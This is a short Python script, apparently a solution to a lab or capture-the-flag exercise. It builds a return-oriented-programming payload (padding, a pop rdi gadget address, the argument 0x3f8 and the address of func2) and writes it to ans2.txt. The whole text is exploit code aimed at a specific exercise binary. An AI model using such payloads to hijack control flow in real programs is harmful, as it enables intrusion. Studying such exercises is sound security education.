padding = b"A" * 16
pop_rdi_addr = b"\xc7\x12\x40\x00\x00\x00\x00\x00"  # pop_rdi地址：0x4012c7
param_value = b"\xf8\x03\x00\x00\x00\x00\x00\x00"   # 参数值：0x3f8
func2_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"    # func2地址：0x401216
payload = padding + pop_rdi_addr + param_value + func2_addr

# 将payload写入ans2.txt文件
with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Payload generated and saved to ans2.txt")
print(f"Payload length: {len(payload)} bytes")
print(f"Payload hex: {payload.hex()}")